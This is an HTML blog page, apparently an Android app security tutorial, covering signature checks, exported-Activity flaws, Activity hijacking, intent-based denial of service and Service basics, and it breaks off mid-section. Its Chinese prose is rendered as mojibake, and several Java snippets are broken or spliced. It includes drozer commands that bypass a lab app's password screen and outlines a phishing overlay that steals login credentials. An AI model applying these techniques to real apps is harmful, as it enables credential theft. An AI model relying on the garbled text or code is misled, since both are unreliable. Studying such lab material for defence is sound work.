<h3 id="signatureä»£ç æ£€æµ‹">signatureä»£ç æ£€æµ‹</h3>
<p>æ£€æŸ¥appæ˜¯å¦æœ‰è°ƒç”¨è·å–signatureçš„ä»£ç ã€‚</p>
<p><strong>é£é™©ç­‰çº§</strong>ï¼š<code>æé†’</code></p>
<p><strong>é—®é¢˜ç¤ºä¾‹</strong>ï¼š</p>
<p>Javaä»£ç </p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PackageManager pkgManager = <span class="built_in">context</span>.getPackageManager();</span><br><span class="line"><span class="keyword">byte[] </span>signature = pkgManager.getPackageInfo(</span><br><span class="line">    <span class="built_in">context</span>.getPackageName(),</span><br><span class="line">    PackageManager.GET_SIGNATURES).signatures[<span class="number">0</span>].toByteArray(); </span><br></pre></td></tr></table></figure>
<p>ä¸Šè¿°ä»£ç åç¼–è¯‘åçš„Dalvik/ARTä»£ç </p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">move-result-object v0</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">iget-object </span>v2, v0, <span class="class">Landroid/content/pm/PackageInfo;</span>-&gt;signatures:[<span class="class">Landroid/content/pm/Signature;</span></span><br></pre></td></tr></table></figure>
<h2 id="ç³»ç»Ÿæ¼æ´æ£€æµ‹">ç³»ç»Ÿæ¼æ´æ£€æµ‹</h2>
<h1>APPä¸€äº›æ¼æ´åŸç†</h1>
<h2 id="Activityç»„ä»¶çš„ç›¸å…³æ¼æ´">Activityç»„ä»¶çš„ç›¸å…³æ¼æ´</h2>
<p><strong>(1) Activityæ¼æ´ç§ç±»</strong></p>
<ul>
<li>è¶Šæƒç»•è¿‡</li>
<li>é’“é±¼æ¬ºè¯ˆ/ActivityåŠ«æŒ</li>
<li>éšç§å¯åŠ¨intentåŒ…å«æ•æ„Ÿä¿¡æ¯</li>
<li>æ‹’ç»æœåŠ¡æ”»å‡»</li>
</ul>
<p><strong>(2) Activityå®‰å…¨åœºæ™¯å’Œå±å®³</strong></p>
<p>Activityçš„ç»„ä»¶å¯¼å‡ºï¼Œä¸€èˆ¬ä¼šå¯¼è‡´çš„é—®é¢˜Android Browser Intent Scheme URLsçš„æ”»å‡»æ‰‹æ®µ</p>
<ul>
<li>æ‹’ç»æœåŠ¡æ”»å‡»ï¼šé€šè¿‡Intentç»™Activityä¼ è¾“ç•¸å½¢æ•°æ®ä½¿å¾—ç¨‹åºå´©æºƒä»è€Œå½±å“ç”¨æˆ·ä½“éªŒ</li>
<li>è¶Šæƒæ”»å‡»ï¼šActivityç”¨æˆ·ç•Œé¢ç»•è¿‡ä¼šé€ æˆç”¨æˆ·ä¿¡æ¯çªƒå–ï¼ŒActivityç•Œé¢è¢«åŠ«æŒäº§ç”Ÿæ¬ºè¯ˆç­‰å®‰å…¨äº‹ä»¶</li>
<li>ç»„ä»¶å¯¼å‡ºå¯¼è‡´é’“é±¼æ¬ºè¯ˆ</li>
<li>éšå¼å¯åŠ¨IntentåŒ…å«æ•æ„Ÿæ•°æ®</li>
</ul>
<h3 id="Activityæ¼æ´åŸç†åˆ†æå’Œå¤ç°">Activityæ¼æ´åŸç†åˆ†æå’Œå¤ç°</h3>
<h4 id="è¶Šæƒç»•è¿‡"><strong>è¶Šæƒç»•è¿‡</strong></h4>
<p><strong>åŸç†åˆ†æ</strong>ï¼š</p>
<p>åœ¨Androidç³»ç»Ÿä¸­ï¼ŒActivityé»˜è®¤æ˜¯ä¸å¯¼å‡ºçš„ï¼Œå¦‚æœè®¾ç½®äº†exported <code>=` `&quot;true&quot;` `è¿™æ ·çš„å…³é”®å€¼æˆ–è€…æ˜¯æ·»åŠ äº†&lt;intent</code>-<code>filter</code>&gt;è¿™æ ·çš„å±æ€§ï¼Œé‚£ä¹ˆæ­¤æ—¶Activityæ˜¯å¯¼å‡ºçš„ï¼Œå°±ä¼šå¯¼è‡´è¶Šæƒç»•è¿‡æˆ–è€…æ˜¯æ³„éœ²æ•æ„Ÿä¿¡æ¯ç­‰å®‰å…¨é£é™©ã€‚</p>
<p><strong>æ¼æ´å¤ç°</strong></p>
<p>é™„ä»¶ï¼šsieve.apk</p>
<p>ä½¿ç”¨drozerè¿›è¡Œåˆ†æ</p>
<p>æ‰“å¼€è¿™ä¸ªdemoï¼Œå‘ç°éœ€è¦è¾“å…¥è´¦å·å’Œå¯†ç æ‰èƒ½è¿›å…¥ä¸‹ä¸€ä¸ªActivityï¼Œæˆ‘ä»¬æ‰æ˜¯è¶Šæƒç»•è¿‡è¿™ä¸ª<code>å¯†ç éªŒè¯</code>ç•Œé¢ã€‚</p>
<ul>
<li>
<p>æŸ¥æ‰¾è¯¥appåŒ…å <code>run app.package.list</code></p>
</li>
<li>
<p>æŸ¥è¯¢ç›®æ ‡åº”ç”¨çš„æ”»å‡»é¢ï¼ŒçŸ¥é“æœ‰ä¸‰ä¸ªActivityæ˜¯è¢«å¯¼å‡ºçš„<br>
<code>run app.package.attacksurface com.mwr.example.sieve</code><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20240921212645899.png" alt="image-20240921212645899"></p>
</li>
<li>
<p>ç»§ç»­æŸ¥è¯¢æš´éœ²çš„Activityä¿¡æ¯<br>
<code>run app.activity.info -a com.mwr.example.sieve</code><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20240921212828487.png" alt="image-20240921212828487"></p>
</li>
<li>
<p>è¯´æ˜å¯ä»¥è¿›è¡ŒActivityç›¸äº’è¶Šæƒ</p>
<p><code>run app.activity.start --component  com.mwr.example.sieve com.mwr.example.sieve.PWList</code></p>
</li>
</ul>
<p><strong>é˜²æŠ¤ç­–ç•¥</strong></p>
<ul>
<li>ç§æœ‰Activityä¸åº”è¯¥è¢«å…¶ä»–åº”ç”¨å¯åŠ¨ç›¸å¯¹æ˜¯å®‰å…¨çš„ï¼Œåˆ›å»ºActivityæ—¶ï¼Œè®¾ç½®exportedå±æ€§ä¸ºfalse</li>
<li>å…¬å¼€æš´éœ²çš„Activityç»„ä»¶ï¼Œå¯ä»¥è¢«ä»»æ„åº”ç”¨å¯åŠ¨ï¼Œåˆ›å»ºActivityï¼šè®¾ç½®exportå±æ€§ä¸ºtrueï¼Œè°¨æ…å¤„ç†æ¥æ”¶çš„Intentï¼Œæœ‰è¿”å›æ•°æ®ä¸åŒ…å«æ•æ„Ÿä¿¡æ¯ï¼Œä¸åº”å‘é€æ•æ„Ÿä¿¡æ¯ï¼Œæ”¶åˆ°è¿”å›æ•°æ®è°¨æ…å¤„ç†</li>
</ul>
<h4 id="é’“é±¼æ¬ºè¯ˆ-ActivityåŠ«æŒ">é’“é±¼æ¬ºè¯ˆ/ActivityåŠ«æŒ</h4>
<p><strong>åŸç†ä»‹ç»</strong></p>
<p>â€‹         Activity appä¸­ä¸åŒç•Œé¢çš„åˆ‡æ¢é€šè¿‡activityçš„è°ƒåº¦æ¥å®ç°ï¼Œè€Œactivityçš„è°ƒåº¦æ˜¯ç”±Activityç³»ç»Ÿä¸­çš„AMSæ¥å®ç°çš„ã€‚æ¯ä¸ªåº”ç”¨æƒ³è¦å¯åŠ¨æˆ–è€…åœæ­¢ä¸€ä¸ªè¿›ç¨‹ï¼Œéƒ½æŠ¥å‘Šç»™AMSã€‚AMSæ”¶åˆ°å¯åŠ¨æˆ–åœæ­¢Activityçš„æ¶ˆæ¯æ—¶ï¼Œå…ˆæ›´æ–°å†…éƒ¨è®°å½•ï¼Œå†é€šçŸ¥ç›¸åº”çš„è¿›ç¨‹æˆ–åœæ­¢æŒ‡å®šçš„Activityã€‚å½“æ–°çš„Activityå¯åŠ¨ï¼Œå‰ä¸€ä¸ªActivityå°±ä¼šåœæ­¢ï¼Œè¿™äº›Activityä¼šä¿ç•™åœ¨ç³»ç»Ÿä¸­çš„ä¸€ä¸ªActivityå†å²æ ˆä¸­ã€‚æ¯æœ‰ä¸€ä¸ªActivityå¯åŠ¨ï¼Œå®ƒå°±å‹å…¥å†å²æ ˆé¡¶ï¼Œå¹¶åœ¨æ‰‹æœºä¸Šæ˜¾ç¤ºã€‚å½“ç”¨æˆ·æŒ‰ä¸‹backï¼Œé¡¶éƒ¨çš„Activityå¼¹å‡ºï¼Œæ¢å¤å‰ä¸€ä¸ªActivityï¼Œæ ˆé¡¶æŒ‡å‘å½“å‰çš„Activityã€‚</p>
<p>â€‹        ç”±äºActivityçš„è¿™ç§ç‰¹æ€§ï¼Œå¦‚æœåœ¨å¯åŠ¨ä¸€ä¸ªactivityæ—¶ï¼Œç»™ä»–åŠ å…¥ä¸€ä¸ªæ ‡ç­¾FLAG_ACTIVITY_NEW_TASKï¼Œå°±ä¼šä½¿ä»–ç½®äºæ ˆé¡¶è®©ä»–ç«‹é©¬å‘ˆç°ç»™ç”¨æˆ·ï¼Œå¦‚æœè¿™ä¸ªActivityæ˜¯ç”¨äºç›—å·çš„ä¼ªè£…Activityï¼Œå°±ä¼šäº§ç”Ÿé’“é±¼å®‰å…¨äº‹ä»¶æˆ–è€…ä¸€ä¸ªActivityä¸­æœ‰webviewåŠ è½½ï¼Œå…è®¸åŠ è½½ä»»æ„ç½‘é¡µéƒ½æœ‰å¯èƒ½äº§ç”Ÿé’“é±¼äº‹ä»¶ã€‚</p>
<p><strong>å®ç°åŸç†ï¼š</strong><br>
å¦‚æœæˆ‘ä»¬æ³¨å†Œä¸€ä¸ªreceiverï¼Œå“åº”android.intent.action.BOOT_COMPLETEDï¼Œä½¿å¾—å¼€å¯å¯åŠ¨ä¸€ä¸ªserviceï¼›è¿™ä¸ªserviceï¼Œä¼šå¯åŠ¨ä¸€ä¸ªè®¡æ—¶å™¨ï¼Œä¸åœæšä¸¾å½“å‰è¿›ç¨‹ä¸­æ˜¯å¦æœ‰é¢„è®¾çš„è¿›ç¨‹å¯åŠ¨ï¼Œå¦‚æœå‘ç°æœ‰é¢„è®¾è¿›ç¨‹ï¼Œåˆ™ä½¿ç”¨FLAG_ACTIVITY_NEW_TASKå¯åŠ¨è‡ªå·±çš„é’“é±¼ç•Œé¢ï¼Œæˆªè·æ­£å¸¸åº”ç”¨çš„ç™»å½•å‡­è¯</p>
<p><strong>å®ç°æ­¥éª¤ï¼š</strong><br>
(<code>1</code>)å¯åŠ¨ä¸€ä¸ªæœåŠ¡<br>
(<code>2</code>)ä¸æ–­æ‰«æå½“å‰è¿›ç¨‹<br>
(<code>3</code>)æ‰¾åˆ°ç›®æ ‡åå¼¹å‡ºä¼ªè£…çª—å£</p>
<p><strong>å®‰å…¨é˜²æŠ¤</strong></p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å¦‚æœçœŸçš„çˆ†å‘äº†è¿™ç§æ¶æ„ç¨‹åºï¼Œæˆ‘ä»¬å¹¶ä¸èƒ½åœ¨å¯åŠ¨ç¨‹åºæ—¶æ¯ä¸€æ¬¡éƒ½é‚£ä¹ˆå°å¿ƒå»æŸ¥çœ‹åˆ¤æ–­å½“å‰åœ¨è¿è¡Œçš„æ˜¯å“ªä¸€ä¸ªç¨‹åºï¼Œå½“android:noHistory<span class="string">``</span>=<span class="string">``</span><span class="string">&quot;true&quot;</span><span class="string">``</span>æ—¶ä¸Šé¢çš„æ–¹æ³•ä¹Ÿæ— æ•ˆ</span><br><span class="line">ç›®å‰ï¼Œå¯¹activityåŠ«æŒçš„é˜²æŠ¤ï¼Œåªèƒ½æ˜¯é€‚å½“ç»™ç”¨æˆ·è­¦ç¤ºä¿¡æ¯ã€‚ä¸€äº›ç®€å•çš„é˜²æŠ¤æ‰‹æ®µå°±æ˜¯æ˜¾ç¤ºå½“å‰è¿è¡Œçš„è¿›ç¨‹æç¤ºæ¡†ã€‚</span><br><span class="line">æ¢†æ¢†åŠ å›ºåˆ™æ˜¯åœ¨è¿›ç¨‹åˆ‡æ¢çš„æ—¶å€™ç»™å‡ºæç¤ºï¼Œå¹¶ä½¿ç”¨ç™½åå•è¿‡æ»¤ã€‚</span><br></pre></td></tr></table></figure>
<h4 id="éšç§å¯åŠ¨IntentåŒ…å«æ•æ„Ÿæ•°æ®">éšç§å¯åŠ¨IntentåŒ…å«æ•æ„Ÿæ•°æ®</h4>
<p><strong>åŸç†ä»‹ç»</strong></p>
<p>ä»‹ç»åŸç†ä¹‹å‰å…ˆç†Ÿæ‚‰ä¸€ä¸‹Intentçš„éšå¼å’Œæ˜¾å¼ä¸¤ç§</p>
<ul>
<li>
<p>æ˜¾å¼æ–¹æ³•<br>
<code>Intent intent = new Intent(MainActivit.this, NewActivity.class)</code></p>
</li>
<li>
<p>éšå¼æ–¹æ³•</p>
<p>ä¸€èˆ¬ç”¨äºä¸åŒåº”ç”¨ç¨‹åºä¹‹é—´çš„æ•°æ®ä¼ é€</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;com.wooyun.test&quot;</span>);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>åŸç†ä»‹ç»ï¼šæœ‰ä¸€ä¸ªåº”ç”¨Aï¼Œé‡‡ç”¨Intentéšå¼ä¼ é€’ï¼Œä»–çš„åŠ¨ä½œæ˜¯&quot;x&quot;ï¼Œæ­¤æ—¶è¿˜æœ‰ä¸€ä¸ªåº”ç”¨Bï¼ŒåŠ¨ä½œä¹Ÿæ˜¯Xï¼Œæˆ‘ä»¬åœ¨å¯åŠ¨çš„æ—¶å€™ï¼Œé€šè¿‡éšå¼Intentä¼ é€’ï¼Œå°±ä¼šå‡ºç°ä¸¤ä¸ªç•Œé¢ï¼Œæˆ‘ä»¬ä¸çŸ¥é“åˆ°åº•å¯åŠ¨Aè¿˜æ˜¯B</p>
<p>å› ä¸ºç°åœ¨è¿™ç§æ¼æ´åœ¨Androidç‰ˆæœ¬æ›´æ–°åï¼ŒåŸºæœ¬å¾ˆå°‘å‡ºç°äº†ï¼Œæ‰€ä»¥è¿™é‡Œå°±ä¸åšå¤ç°å’Œå®‰å…¨é˜²æŠ¤äº†</p>
<h4 id="æ‹’ç»æœåŠ¡æ”»å‡»">æ‹’ç»æœåŠ¡æ”»å‡»</h4>
<p><strong>åŸç†ä»‹ç»</strong></p>
<p>â€‹        æ‹’ç»æœåŠ¡æ”»å‡»æºäºç¨‹åºæ²¡æœ‰å¯¹Intent.getXXXExtra()è·å–çš„å¼‚å¸¸æˆ–è€…ç•¸å½¢æ•°æ®å¤„ç†æ—¶æ²¡æœ‰è¿›è¡Œå¼‚å¸¸æ•è·ï¼Œä»è€Œå¯¼è‡´æ”»å‡»è€…å‘åº”ç”¨ç¨‹åºå‘é€æ­¤ç±»ç©ºæ•°æ®ï¼Œå¼‚å¸¸æˆ–è€…ç•¸å½¢æ•°æ®æ¥è¾¾åˆ°ä½¿è¯¥åº”ç”¨crashçš„ç›®çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡intentå‘é€ç©ºæ•°æ®ï¼Œå¼‚å¸¸æˆ–è€…ç•¸å½¢æ•°æ®ç»™æ­£å¸¸åº”ç”¨ï¼Œå¯¼è‡´å…¶å´©æºƒã€‚æœ¬åœ°æ‹’ç»æœåŠ¡å¯ä»¥è¢«ç«äº‰æ–¹åˆ©ç”¨æ”»å‡»ï¼Œä½¿å¾—è‡ªå·±çš„åº”ç”¨å´©æºƒé€ æˆç ´åã€‚</p>
<p>â€‹        å±å®³ï¼šæ‹’ç»æœåŠ¡æ¼æ´å¯¹äºé”å±åº”ç”¨ã€å®‰å…¨é˜²æŠ¤ç±»è½¯ä»¶å±å®³æ˜¯å·¨å¤§çš„</p>
<p><strong>å®‰å…¨é˜²æŠ¤</strong></p>
<h5 id="Androidå¤–éƒ¨ç¨‹åºçš„è°ƒç”¨æ–¹æ³•">Androidå¤–éƒ¨ç¨‹åºçš„è°ƒç”¨æ–¹æ³•</h5>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.ä½¿ç”¨è‡ªå®šä¹‰çš„Action</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Aç¨‹ç¿ ä¸­è°ƒç”¨ä»£ç ä¸ºï¼š</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;com.test.action.PLAYER&quot;</span>);              </span><br><span class="line">startActivity(intent);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Bç¨‹åºä¸­çš„AndroidManifest.xmlä¸­å¯åŠ¨Activityçš„intent-filter</span></span><br><span class="line">    &lt;intent-filter&gt;</span><br><span class="line">                  &lt;action android:name=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span><br><span class="line">                   &lt;action android:name=<span class="string">&quot;com.test.action.PLAYER&quot;</span> /&gt;</span><br><span class="line">                   &lt;category android:name=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span> /&gt;</span><br><span class="line">                       &lt;!--å¿…é¡»ï¼Œå¦åˆ™æ— æ•ˆ--&gt;</span><br><span class="line">                  &lt;category android:name=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span><br><span class="line">    &lt;/intent-filter&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.ä½¿ç”¨åŒ…ç±»å</span></span><br><span class="line">                      </span><br><span class="line"><span class="comment">//Aç¨‹åºä¸­è°ƒç”¨çš„ä»£ç ï¼š</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intetn</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;åŒ…å&quot;</span>,<span class="string">&quot;ç±»å&quot;</span>);</span><br><span class="line">startActivity(intent);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.ä½¿ç”¨ComponentName</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="type">ComponentName</span> <span class="variable">comp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ComponentName</span>(<span class="string">&quot;åŒ…å&quot;</span>,<span class="string">&quot;ç±»å&quot;</span>);</span><br><span class="line">intent.setComponent(comp);</span><br><span class="line">startActivity();</span><br><span class="line"></span><br><span class="line"><span class="comment">//Bç¨‹åºè¢«è°ƒç”¨ä¸­AndroidManifest.xmlä¸­å¯åŠ¨Activityçš„intent-filterä¸éœ€è¦ç‰¹åˆ«åŠ å…¥å…¶å®ƒä¿¡æ¯ï¼Œå¦‚ä¸‹å³å¯ï¼š</span></span><br><span class="line">      &lt;intent-filter&gt;</span><br><span class="line">          &lt;action android:name=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span><br><span class="line">      	  &lt;category android:name=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span><br><span class="line">      &lt;/intent-filter&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å®‰å…¨é˜²æŠ¤ï¼š</span><br><span class="line">  <span class="string">``</span>ï¼ˆ<span class="string">``</span><span class="number">1</span><span class="string">``</span>ï¼‰ç©ºæŒ‡é’ˆå¼‚å¸¸ã€ç±»å‹è½¬æ¢å¼‚å¸¸ã€æ•°ç»„è¶Šç•Œè®¿é—®å¼‚å¸¸ã€ç±»æœªå®šä¹‰å¼‚å¸¸ã€å…¶å®ƒå¼‚å¸¸</span><br><span class="line">  <span class="string">``</span>ï¼ˆ<span class="string">``</span><span class="number">2</span><span class="string">``</span>ï¼‰è°¨æ…å¤„ç†æ¥æ”¶çš„intentä»¥åŠå…¶æºå¸¦çš„ä¿¡æ¯ï¼Œå¯¹æ¥æ”¶åˆ°çš„ä»»ä½•æ•°æ®åš<span class="string">``</span><span class="keyword">try</span><span class="string">``</span>/<span class="string">``</span><span class="keyword">catch</span>å¤„ç†ï¼Œä»¥åŠå¯¹ä¸ç¬¦åˆé¢„æœŸæ•°æ®åšå¼‚å¸¸å¤„ç†</span><br><span class="line">æ€»ç»“ï¼š</span><br><span class="line"><span class="number">1.</span><span class="string">``</span>ä¸éœ€è¦è¢«å¤–éƒ¨è°ƒç”¨çš„activityè®¾ç½®android:exported<span class="string">``</span>=<span class="string">``</span><span class="string">&quot;false&quot;</span><span class="string">``</span>ï¼›</span><br></pre></td></tr></table></figure>
<p><strong>å®‰å…¨é˜²æŠ¤</strong>ï¼š</p>
<p>â€‹	(1)ç©ºæŒ‡é’ˆå¼‚å¸¸ï¼Œç±»å‹è½¬æ¢å¼‚å¸¸ï¼Œæ•°ç»„è¶Šç•Œè®¿é—®å¼‚å¸¸ï¼Œç±»æœªå®šä¹‰å¼‚å¸¸ï¼Œå…¶ä»–å¼‚å¸¸</p>
<p>â€‹    (2)è°¨æ…å¤„ç†æ¥æ”¶çš„intentä»¥åŠå…¶æºå¸¦çš„ä¿¡æ¯ï¼Œå¯¹æ¥æ”¶åˆ°çš„ä»»ä½•æ•°æ®åš<code>try/catch</code>å¤„ç†ï¼Œä»¥åŠå¯¹ä¸ç¬¦åˆé¢„æœŸæ•°æ®åšå¼‚å¸¸å¤„ç†</p>
<p>æ€»ç»“ï¼š</p>
<p>1.ä¸éœ€è¦è¢«å¤–éƒ¨è°ƒç”¨çš„activityè®¾ç½®android:exported<code>=</code>â€œfalseâ€ï¼›</p>
<p>2.è‹¥éœ€è¦å¤–éƒ¨è°ƒç”¨ï¼Œéœ€è‡ªå®šä¹‰signatureæˆ–è€…signatureOrSystemçº§åˆ«çš„æƒé™ï¼›</p>
<p>3.æ³¨å†Œçš„ç»„ä»¶è¯·ä¸¥æ ¼æ ¡éªŒè¾“å…¥å‚æ•°ï¼Œæ³¨æ„ç©ºå€¼åˆ¤å®šå’Œç±»å‹è½¬æ¢åˆ¤æ–­</p>
<h2 id="Serviceç»„ä»¶ç›¸å…³æ¼æ´">Serviceç»„ä»¶ç›¸å…³æ¼æ´</h2>
<h3 id="serviceåŸºæœ¬ä»‹ç»">serviceåŸºæœ¬ä»‹ç»</h3>
<p><strong>æ­¥éª¤</strong>ï¼š</p>
<ul>
<li>â€‹	åˆ›å»ºä¸€ä¸ªserviceæœåŠ¡</li>
<li>æˆ‘ä»¬é‡å†™æœåŠ¡ä¸­çš„ä¸‰å¤§æ–¹æ³•onCreate()ï¼ŒonStartCommand()ï¼ŒonDestory()</li>
</ul>
<p><strong>è¯¦è§£</strong></p>
<ul>
<li>onCreate()æ–¹æ³•ä¼šåœ¨æœåŠ¡åˆ›å»ºçš„æ—¶å€™è°ƒç”¨</li>
<li>onStartCommand()æ–¹æ³•ä¼šåœ¨æ¯æ¬¡æœåŠ¡å¯åŠ¨çš„æ—¶å€™è°ƒç”¨ï¼Œé€šå¸¸æˆ‘ä»¬å¸Œæœ›æœåŠ¡åœ¨å¼€å¯ç«‹åˆ»æ‰§è¡ŒæŸä¸ªåŠ¨ä½œå°±ä¼šåœ¨onStartCommand()é‡Œ</li>
<li>onDestroy()ä¼šåœ¨æœåŠ¡é”€æ¯çš„æ—¶å€™è°ƒç”¨</li>
</ul>
<h3 id="serviceå¯åŠ¨">serviceå¯åŠ¨</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20240922163909306.png" alt="image-20240922163909306"></p>
<p><strong>å¯åŠ¨æ–¹å¼</strong></p>
<ul>
<li>startServiceï¼šä¸»è¦ç”¨äºå¯åŠ¨ä¸€ä¸ªæœåŠ¡æ‰§è¡Œåå°ä»»åŠ¡ï¼Œä¸è¿›è¡Œé€šä¿¡ï¼Œè€Œä¸”å¿…é¡»ç”¨stopServiceæ¥ç»“æŸï¼Œä¸è°ƒç”¨ä¼šå¯¼è‡´activityç»“æŸè€ŒServiceè¿˜è¿è¡Œ</li>
<li>bindServiceï¼šè¯¥æ–¹æ³•å¯åŠ¨çš„æœåŠ¡è¿˜å¯ä»¥è¿›è¡Œé€šä¿¡ï¼Œå¯åŠ¨çš„Serviceå¯ä»¥æœ‰unbindServiceæ¥ç»“æŸï¼Œä¹Ÿå¯ä»¥åœ¨activityç»“æŸä¹‹åè‡ªåŠ¨ç»“æŸ</li>
<li>startService åŒæ—¶ä¹Ÿ bindService å¯åŠ¨çš„æœåŠ¡ï¼šåœæ­¢æœåŠ¡åº”åŒæ—¶ä½¿ç”¨stopServiceå’ŒunbindService</li>
</ul>
<p><strong>StartService</strong></p>
<p>æˆ‘ä»¬æ ¹æ®Intentçš„å¯åŠ¨æ–¹å¼ï¼Œåˆå¯ä»¥é€šè¿‡æ˜¾å¼å¯åŠ¨å’Œéšå¼å¯åŠ¨</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">æ˜¾ç¤ºå¯åŠ¨ï¼š</span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>,TestService.class);</span><br><span class="line">startService(intent);</span><br><span class="line"></span><br><span class="line">éšå¼å¯åŠ¨ï¼š</span><br><span class="line">(<span class="number">1</span>) ä½¿ç”¨Action </span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;xxx&quot;</span>);<span class="comment">//serviceä¸­å®šä¹‰çš„action</span></span><br><span class="line">intent.setPackage(getPackageName);éœ€è¦è®¾ç½®çš„åº”ç”¨åŒ…å</span><br><span class="line">startService(intent);</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>) ä½¿ç”¨åŒ…åå¯åŠ¨</span><br><span class="line"><span class="type">IntenComponentName</span> <span class="variable">componentName</span> <span class="operator">=</span> New <span class="title function_">ComponentName</span><span class="params">(getPackageName()</span>,<span class="string">&quot;com.example.testservices.TestService&quot;</span>);</span><br><span class="line">intent.setComponent(componentName);</span><br><span class="line">startService(intent);<span class="type">t</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br></pre></td></tr></table></figure>
<h3 id="bindServiceå¯åŠ¨">bindServiceå¯åŠ¨</h3>
<p>æˆ‘ä»¬è¦å®ç°æœåŠ¡æˆ–æ´»åŠ¨ä¹‹é—´çš„é€šè®¯ï¼Œæˆ‘ä»¬è¦ä½¿ç”¨bindé€šä¿¡æœºåˆ¶</p>
<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">åŸç†è§£æ</span><br><span class="line">ï¼ˆ<span class="number">1</span>ï¼‰bindServiceå¯åŠ¨çš„æœåŠ¡å’Œè°ƒç”¨è€…æ˜¯å…¸å‹çš„<span class="keyword">client</span>-serviceæ¨¡å¼ã€‚è°ƒç”¨è€…æ˜¯<span class="keyword">client</span>ï¼Œserviceæ˜¯serviceç«¯ï¼Œserviceåªæœ‰ä¸€ä¸ªï¼Œä½†æ˜¯ç»‘å®šåˆ°serviceä¸Šçš„<span class="keyword">client</span>å¯ä»¥æœ‰ä¸€ä¸ªæˆ–è€…å¤šä¸ª</span><br><span class="line">ï¼ˆ<span class="number">2</span>ï¼‰<span 